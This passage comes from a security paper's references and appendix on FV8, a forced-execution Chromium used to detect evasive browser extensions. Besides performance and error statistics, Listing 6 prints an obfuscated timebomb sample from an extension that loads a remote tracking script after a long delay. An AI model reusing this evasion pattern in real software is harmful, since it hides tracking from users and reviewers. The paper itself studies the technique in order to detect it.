+     plications Conference, ACSAC ’19, page 257–269, New               637–652, USA, 2013. USENIX Association.
+     York, NY, USA, 2019. Association for Computing Ma-           [44] Soheil Khodayari and Giancarlo Pellegrino. JAW:
+     chinery.                                                          Studying client-side CSRF with hybrid property graphs
+                                                                       and declarative traversals. In 30th USENIX Security
+[35] Aurore Fass, Dolière Francis Somé, Michael Backes,
+                                                                       Symposium (USENIX Security 21), pages 2525–2542.
+     and Ben Stock. Doublex: Statically detecting vulnerable
+                                                                       USENIX Association, August 2021.
+     data flows in browser extensions at scale. In Proceedings
+     of the 2021 ACM SIGSAC Conference on Computer and            [45] Kyungtae Kim, I Luk Kim, Chung Hwan Kim, Yonghwi
+     Communications Security, CCS ’21, page 1789–1804,                 Kwon, Yunhui Zheng, Xiangyu Zhang, and Dongyan Xu.
+     New York, NY, USA, 2021. Association for Computing                J-force: Forced execution on javascript. In Proceedings
+     Machinery.                                                        of the 26th International Conference on World Wide
+                                                                       Web, WWW ’17, page 897–906, Republic and Canton
+[36] Fabian Froh, Matías Gobbi, and Johannes Kinder. Dif-              of Geneva, CHE, 2017. International World Wide Web
+     ferential static analysis for detecting malicious updates         Conferences Steering Committee.
+     to open source packages. arXiv preprint, 2023.
+                                                                  [46] Maryna Kluban, Mohammad Mannan, and Amr Youssef.
+[37] Xunchao Hu, Yao Cheng, Yue Duan, Andrew Hen-                      On measuring vulnerable javascript functions in the wild.
+     derson, and Heng Yin. Jsforce: A forced execu-                    In Proceedings of the 2022 ACM on Asia Conference
+     tion engine for malicious javascript detection. CoRR,             on Computer and Communications Security, ASIA CCS
+     abs/1701.07860, 2017.                                             ’22, page 917–930, New York, NY, USA, 2022. Associ-
+                                                                       ation for Computing Machinery.
+[38] Umar Iqbal, Peter Snyder, Shitong Zhu, Benjamin
+     Livshits, Zhiyun Qian, and Zubair Shafiq. Adgraph: A         [47] Clemens Kolbitsch, Benjamin Livshits, Benjamin Zorn,
+     graph-based approach to ad and tracker blocking, 2019.            and Christian Seifert. Rozzle: De-cloaking internet
+
+
+
+3762   33rd USENIX Security Symposium                                                                     USENIX Association
+     malware. In 2012 IEEE Symposium on Security and              [56] Alexander Sjösten, Steven Van Acker, and Andrei
+     Privacy, pages 443–457, 2012.                                     Sabelfeld. Discovering browser extensions via web
+                                                                       accessible resources. In Proceedings of the Seventh
+[48] Piergiorgio Ladisa, Merve Sahin, Serena Elisa Ponta,              ACM on Conference on Data and Application Security
+     Marco Rosa, Matias Martinez, and Olivier Barais. The              and Privacy, CODASPY ’17, page 329–336, New York,
+     hitchhiker’s guide to malicious third-party dependencies.         NY, USA, 2017. Association for Computing Machinery.
+     arXiv preprint arXiv:2307.09087, 2023.
+                                                                  [57] Konstantinos Solomos, Panagiotis Ilia, Soroush Karami,
+[49] Bo Li, Phani Vadrevu, Kyu Hyung Lee, and Roberto                  Nick Nikiforakis, and Jason Polakis. The dangers of hu-
+     Perdisci. Jsgraph: Enabling reconstruction of web at-             man touch: Fingerprinting browser extensions through
+     tacks via efficient tracking of live in-browser javascript        user actions. In 31st USENIX Security Symposium
+     executions. In Network and Distributed System Security            (USENIX Security 22), pages 717–733, Boston, MA,
+     Symposium, 2018.                                                  August 2022. USENIX Association.
+[50] Sourena Maroofi, Maciej Korczyński, and Andrzej Duda.
+                                                                  [58] Dolière Francis Somé. Empoweb: Empowering web
+     Are you human? resilience of phishing detection to eva-
+                                                                       applications with browser extensions. In 2019 IEEE
+     sion techniques based on human verification. In Pro-
+                                                                       Symposium on Security and Privacy (SP), pages 227–
+     ceedings of the ACM Internet Measurement Conference,
+                                                                       245, 2019.
+     IMC ’20, page 78–86, New York, NY, USA, 2020. As-
+     sociation for Computing Machinery.                           [59] Marius Steffens and Ben Stock. Pmforce: System-
+                                                                       atically analyzing postmessage handlers at scale. In
+[51] Siddharth Muralee, Igibek Koishybayev, Aleksandr Na-
+                                                                       Proceedings of the 2020 ACM SIGSAC Conference on
+     hapetyan, Greg Tystahl, Brad Reaves, Antonio Bianchi,
+                                                                       Computer and Communications Security, CCS ’20, page
+     William Enck, Alexandros Kapravelos, and Aravind
+                                                                       493–505, New York, NY, USA, 2020. Association for
+     Machiry. ARGUS: A framework for staged static
+                                                                       Computing Machinery.
+     taint analysis of GitHub workflows and actions. In
+     32nd USENIX Security Symposium (USENIX Security
+                                                                  [60] Kurt Thomas, Elie Bursztein, Chris Grier, Grant Ho, Nav
+     23), pages 6983–7000, Anaheim, CA, August 2023.
+                                                                       Jagpal, Alexandros Kapravelos, Damon Mccoy, Antonio
+     USENIX Association.
+                                                                       Nappa, Vern Paxson, Paul Pearce, Niels Provos, and
+[52] Marc Ohm, Henrik Plate, Arnold Sykosch, and Michael               Moheeb Abu Rajab. Ad injection at scale: Assessing
+     Meier. Backstabber’s knife collection: A review of open           deceptive advertisement modifications. In 2015 IEEE
+     source software supply chain attacks. In Clémentine               Symposium on Security and Privacy, pages 151–167,
+     Maurice, Leyla Bilge, Gianluca Stringhini, and Nuno               2015.
+     Neves, editors, Detection of Intrusions and Malware,
+                                                                  [61] Elizabeth Wyss, Alexander Wittman, Drew Davidson,
+     and Vulnerability Assessment, pages 23–43, Cham, 2020.
+                                                                       and Lorenzo De Carli. Wolf at the door: Preventing
+     Springer International Publishing.
+                                                                       install-time attacks in npm with latch. In Proceedings
+[53] Nikolaos Pantelaios and Alexandros Kapravelos. Mani-              of the 2022 ACM on Asia Conference on Computer
+     fest V3 Unveiled: Navigating the New Era of Browser               and Communications Security, ASIA CCS ’22, page
+     Extensions. arXiv e-prints, page arXiv:2404.08310,                1139–1153, New York, NY, USA, 2022. Association for
+     April 2024.                                                       Computing Machinery.
+
+[54] Nikolaos Pantelaios, Nick Nikiforakis, and Alexandros        [62] Xinyu Xing, Wei Meng, Byoungyoung Lee, Udi Weins-
+     Kapravelos. You’ve changed: Detecting malicious                   berg, Anmol Sheth, Roberto Perdisci, and Wenke
+     browser extensions through their update deltas. In Pro-           Lee. Understanding malvertising through ad-injecting
+     ceedings of the 2020 ACM SIGSAC Conference on Com-                browser extensions. In Proceedings of the 24th Inter-
+     puter and Communications Security, CCS ’20, page                  national Conference on World Wide Web, WWW ’15,
+     477–491, New York, NY, USA, 2020. Association for                 page 1286–1295, Republic and Canton of Geneva, CHE,
+     Computing Machinery.                                              2015. International World Wide Web Conferences Steer-
+                                                                       ing Committee.
+[55] Shaown Sarker, Jordan Jueckstock, and Alexandros
+     Kapravelos. Hiding in Plain Site: Detecting JavaScript       [63] Junan Zhang, Kaifeng Huang, Bihuan Chen, Chong
+     Obfuscation through Concealed Browser API Usage. In               Wang, Zhenhao Tian, and Xin Peng. Malicious pack-
+     Proceedings of the ACM Internet Measurement Confer-               age detection in npm and pypi using a single model of
+     ence (IMC), October 2020.                                         malicious behavior sequence. arXiv preprint, 09 2023.
+
+
+
+USENIX Association                                                                 33rd USENIX Security Symposium       3763
+[64] Penghui Zhang, Adam Oest, Haehyun Cho, Zhibo Sun,                 Error Category             Number of Occurrences
+     RC Johnson, Brad Wardman, Shaown Sarker, Alexan-                  Name Not Resolved                   355
+     dros Kapravelos, Tiffany Bao, Ruoyu Wang, Yan Shoshi-             CORS Policy                         924
+     taishvili, Adam Doupé, and Gail-Joon Ahn. Crawlphish:             Blocked by Client                   812
+     Large-scale analysis of client-side cloaking techniques           Crawler Errors                     1389
+     in phishing. In 2021 IEEE Symposium on Security and
+     Privacy (SP), pages 1109–1124, 2021.                                      Table 9: Summary of Error Occurrences.
+
+
+Appendix                                                           systems for data collection. Notably, the types of errors and
+                                                                   their frequencies provide insights into both the technical chal-
+A      Performance Evaluation based on Tranco                      lenges and the operational limitations of the FV8 environment
+       top10k                                                      under test conditions.
+
+Our tool is intended for a one-off usage, not requiring constant    1 // tracker added on timebomb
+operation. Even under these conditions though, it is critical to    2 var _0x577791=_0x4eb1;
+assess the tool’s performance. We assess the performance of         3 function _0x14ec() {
+FV8 by conducting experiments on the top 10,000 websites            4     var e = ["1138VmSxWa", "Tracking", "src", "4230130
+                                                                         mSYYki", "233IhnkhY", "t.js", "enableLink", "748864
+listed by Tranco [30]. Each website is accessed using a crawler
+                                                                         vEyXjS", "https://ma", "16XmccgG", "tomo.deban", "push
+that operates an instance of the modified Chromium browser,              ", "k.com/", "trackPageV", "/vendor/ma", "insertBefo",
+FV8, aiming to retrieve a document. Our findings indicate a               "local", "storage", "tomo.clien", "extensionI", "_paq
+high success rate, with approximately 99% of the websites                ", "iew", "1027233PESGTW", "5761csZcKy", "10shZjqe", "
+loading successfully, and only about 1% failing to load.                 2490gWahxv", "parentNode", "458091OjKjhr", "7358560
+   The time taken to visit a website is measured from the                MtfWnx", "get"];
+moment the browser is spawned until the successful retrieval        5     return (_0x14ec = function () { return e })()}
+                                                                    6 [..]
+of an HTML document. This measurement is performed us-
+                                                                    7 setTimeout(() => { var e = _0x4eb1;
+ing both the FV8-modified Chromium browser and the de-              8     chrome[e(422)][e(421)][e(434)](e(424) + "d", function
+fault Chromium browser (version 122 as the base for both                  (n) {
+versions). Our results show an average increase of 1.9% in          9         var r = e;
+loading times when using FV8, resulting in an overall per-         10         r(413), r(415), r(417), g[r(437)] = r(419) + r
+formance efficiency of 98.1% in loading times compared to                (423) + r(440);
+                                                                   11         s[r(431)][r(420) + "re"](g, s)})
+the unmodified version. The performance we have achieved
+                                                                   12 }, 93445e3);
+justifies our decision to selectively execute only some branch
+paths, demonstrating that this targeted approach is not only              Listing 6: Timebomb evasion example (Obfuscated).
+effective in optimizing the detection process but also efficient
+in resource usage.
+                                                                   C    Timebomb Detection Limitation under Ob-
+B    FV8 Errors Evaluation                                              fuscation
+To investigate the impact of the custom browser with forced        Even though a straightforward timebomb condition can be
+execution, we analyzed the web breakage by monitoring con-         detected by our system, there are limitations. In this scenario,
+sole errors during 400,000 visits to URLs through our exten-       the presence of obfuscated code in Listing 6, which mirrors
+sions. Our analysis excludes common script errors such as          the timebomb in Listing 1, highlights a limitation in our de-
+Uncaught ReferenceError, which are present even with-              tection capabilities. Our system relies on recognizing two
+out the use of our tool. Additionally, we accounted for errors     specific steps. The first step is detecting the condition (e.g.,
+generated by the crawler instrumentation, which serves as a        the content of an "if" statement) as an evasion. The second
+wrapper around FV8 and facilitates website visits with en-         step is identifying the API contained within the condition
+hanced parallelization.                                            block (line 10). When both elements are obfuscated, as seen
+   The overall breakage rate observed was approximately 1%.        in Listing 6, our system cannot detect the evasion. The system
+This rate includes various categories of errors, which are de-     fails to recognize the evasive condition or identify the asso-
+tailed in Table 9. Specific errors tracked include ’Name Not       ciated API due to the code’s obfuscation. This emphasizes
+Resolved’, ’CORS Policy’, ’Blocked by Client’, and errors          our initial goal, which is to run FV8 in conjunction with a
+directly attributable to the crawler. The highest number of        code deobfuscator, allowing both the condition and the API
+incidents was reported for crawler-related issues, indicating      to be easily understandable for our tool and thus detecting the
+the complexity of web interactions when using automated            timebomb evasion.
+
+
+
+3764    33rd USENIX Security Symposium                                                                      USENIX Association
+
